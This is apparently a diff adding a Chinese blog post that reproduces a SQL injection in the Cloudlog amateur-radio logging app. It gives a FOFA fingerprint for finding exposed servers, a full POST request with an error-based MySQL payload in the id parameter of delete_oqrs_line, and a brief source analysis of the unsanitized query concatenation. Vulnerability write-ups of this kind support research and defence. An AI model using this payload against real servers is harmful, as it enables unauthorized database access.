@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+  <title>
+    
+    Cloudlog_sql注入 丨
+    
+
+    le0
+  </title>
+
+  
+  <link rel="shortcut icon" href="/icon.svg">
+  
+
+  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  
+  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
+  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
+  
+
+  <!-- 字体 -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+
+  
+<link rel="stylesheet" href="/css/root.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/post.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <header class="header">
+  <section class="header-container">
+    <a class="logo" href="/">Le0的随便写写</a>
+    <ul class="nav">
+      
+      <li><a href="/archives">archives</a></li>
+      
+    </ul>
+  </section>
+</header>
+  <main class="main">
+    <article class="post">
+  
+  <div class="post-title">Cloudlog_sql注入</div>
+  <div class="post-meta">
+    <div class="date">2024 November 21st</div>
+    <div class="tags">
+      
+      <div class="tag-item">漏洞复现</div>
+      
+    </div>
+  </div>
+  
+
+  <main class="post-content"><p><strong>Cloudlog 是一个自托管的 PHP 应用程序，它允许你在任何地方记录你的业余无线电联络。</strong></p>
+<p>fofa：<code>icon\_hash=&quot;-460032467&quot;</code></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/magicbug/Cloudlog">https://github.com/magicbug/Cloudlog</a></p>
+<pre><code class="highlight plain">POST /index.php/oqrs/delete_oqrs_line HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+ 
+id=GTID_SUBSET(CONCAT((MID((IFNULL(CAST(VERSION() AS NCHAR),0x20)),1,190))),666)</code></pre>
+
+<p><strong>根据情报跟踪到传参接口和参数：post index.php&#x2F;oqrs&#x2F;delete_oqrs_line 参数id</strong></p>
+<p><strong>assets&#x2F;js&#x2F;sections&#x2F;oqrs.js</strong></p>
+<p><strong>application&#x2F;controllers&#x2F;Oqrs.php</strong></p>
+<p><img src="/images/Cloudlog_sqli/Cloudlog_sqli1.png"></p>
+<p><strong>在控制器处理完请求参数后，通常会将数据传递给模型（Model）进行进一步的数据处理或数据库交互。模型专注于业务逻辑和数据的操作，如查询、添加、修改或删除数据库记录等。</strong></p>
+<p><strong>可以看到，参数可能经过了xss清理，也可能是后面打的补丁，但是并没有做sql注入方面的防御，直接拼进了sql语句，故而存在sql注入。</strong></p>
+<p><strong>application&#x2F;models&#x2F;Oqrs_model.php</strong></p>
+<p><img src="/images/Cloudlog_sqli/Cloudlog_sqli2.png"></p>
+<p><img src="/images/Cloudlog_sqli/Cloudlog_sqli3.png"></p>
+<p><strong>从application&#x2F;models&#x2F;Oqrs_model.php 中可以看到，除了上述语句，还存在大量的直接拼接情况。</strong></p>
+<p><img src="/images/Cloudlog_sqli/Cloudlog_sqli4.png"></p>
+<p><img src="/images/Cloudlog_sqli/Cloudlog_sqli5.png"></p>
+</main>
+
+</article>
+
+
+<script src="/js/highlight.js"></script>
+
+  </main>
+  <footer class="footer">
+  
+  <span>Copyright © 2024 typole0</span>
+  
+</footer>
+  
+<script src="/js/theme.js"></script>
+
+</body>
+
+</html>
